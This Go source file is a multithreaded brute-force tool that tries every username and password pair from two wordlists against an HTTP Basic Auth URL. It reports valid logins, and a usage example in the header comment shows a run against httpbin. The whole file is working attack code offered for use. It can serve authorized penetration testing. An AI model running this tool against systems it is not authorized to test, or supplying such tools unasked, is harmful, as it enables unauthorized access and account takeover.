/*
Copyright (c) 2017, AverageSecurityGuy
# All rights reserved.

Simple Go script to test a username and password list against an HTTP Basic
Auth server. Example usage and output:

$ ./brute_http_basic https://httpbin.org/basic-auth/test/test test words.txt
https://httpbin.org/basic-auth/test/test - test:test
*/

package main

import (
    "os"
    "fmt"
    "sync"
    "net/http"
    "bufio"
    "strings"
)


type Cred struct {
    User string
    Pass string
}


func print_line(msg string) {
    fmt.Printf("[*] %s\n", msg)
}


func print_good(msg string) {
    fmt.Printf("[+] %s\n", msg)
}


func print_error(msg string) {
    fmt.Printf("[E] %s\n", msg)
}


func open(filename string) *os.File {
    /*
    Open a file as read only.
    */
    data, err := os.Open(filename)
    if err != nil {
        print_error(err.Error())
    }

    return data
}


func basicAuth(url, username, password string) {
    /*
    Send an HTTP Basic Auth request with the given username and password.
    */
    client := &http.Client{}

    req, err := http.NewRequest("GET", url, nil)
    req.SetBasicAuth(username, password)

    resp, err := client.Do(req)

    if err != nil {
        print_error(err.Error())
    } else if resp.StatusCode == 401 {
        // print_error(fmt.Sprintf("Invalid: %s:%s", username, password))
    } else {
        print_good(fmt.Sprintf("Valid: %s:%s\n", username, password))
    }
}


func main() {
    if len(os.Args) != 4 {
        fmt.Println("Usage: brute_http_basic url user_file pass_file")
        os.Exit(1)
    }

    url := os.Args[1]
    user_file := os.Args[2]
    pass_file := os.Args[3]
    threads := 10

    // Open our username and password lists.
    print_line(fmt.Sprintf("Opening username file: %s", user_file))
    users := open(user_file)

    print_line(fmt.Sprintf("Opening password file: %s", pass_file))
    pwds := open(pass_file)

    // Create Channels
    credChan := make(chan Cred, threads)
    processorGroup := new(sync.WaitGroup)
    processorGroup.Add(threads)

    // Create Threads
    for i := 0; i < threads; i++ {
        go func() {
            for {
                cred, ok := <- credChan

                if ok {
                    basicAuth(url, cred.User, cred.Pass)
                } else {
                    break
                }
            }

            processorGroup.Done()
        }()
    }

    print_line("Building credentials.")
    uscan := bufio.NewScanner(users)

    for uscan.Scan() {
        user := uscan.Text()

        if strings.HasPrefix(user, "#") == true {
            continue
        }

        pscan := bufio.NewScanner(pwds)

        for pscan.Scan() {
            pass := pscan.Text()

            if strings.HasPrefix(pass, "#") == true {
                continue
            }

            credChan <- Cred{user, pass}
        }

        // Reset the password file so we can rescan it for the next user.
        pwds.Seek(0, 0)
    }

    defer users.Close()
    defer pwds.Close()

    close(credChan)
    processorGroup.Wait()
}
